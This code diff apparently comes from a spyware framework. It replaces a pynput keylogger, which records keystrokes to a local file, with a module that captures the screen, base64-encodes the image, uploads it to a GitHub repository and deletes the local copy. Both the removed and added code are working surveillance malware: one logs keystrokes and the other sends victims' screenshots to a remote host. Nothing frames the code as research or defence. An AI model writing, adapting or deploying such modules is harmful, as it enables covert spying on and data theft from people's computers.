@@ -1,20 +1,43 @@
-from pynput import keyboard
+import pyautogui
+import os
+import base64
+from datetime import datetime
 
-log_file = "keylog.txt"
+def take_screenshot():
+    # Generate a unique filename based on the current timestamp
+    filename = f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
+    
+    # Take a screenshot
+    screenshot = pyautogui.screenshot()
+    
+    # Save the screenshot to the current directory
+    screenshot.save(filename)
+    
+    return filename
 
-def on_press(key):
+def send_screenshot_to_github(filename, repo, data_path):
     try:
-        with open(log_file, "a") as f:
-            f.write(key.char)
-    except AttributeError:
-        with open(log_file, "a") as f:
-            f.write(f"[{key}]")
+        with open(filename, 'rb') as file:
+            bindata = base64.b64encode(file.read()).decode('utf-8')
+        
+        message = f"Screenshot taken at {datetime.now().isoformat()}"
+        remote_path = f'{data_path}{filename}'
+        repo.create_file(remote_path, message, bindata)
+        print(f"Screenshot {filename} uploaded to GitHub.")
+    except Exception as e:
+        print(f"Error uploading screenshot to GitHub: {e}")
 
 def run():
-    # Starts the keylogger and waits for keys to be pressed
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
-
-if __name__ == "__main__":
-    run()
+    repo = github_connect()  # Assuming you have a function to connect to GitHub
+    data_path = 'data/screenshots/'  # Adjust this path based on your setup
+    
+    # Take a screenshot
+    screenshot_file = take_screenshot()
+    
+    # Send the screenshot to GitHub
+    send_screenshot_to_github(screenshot_file, repo, data_path)
+    
+    # Clean up by deleting the local screenshot file after uploading
+    os.remove(screenshot_file)
+    print("Screenshot module executed")
 
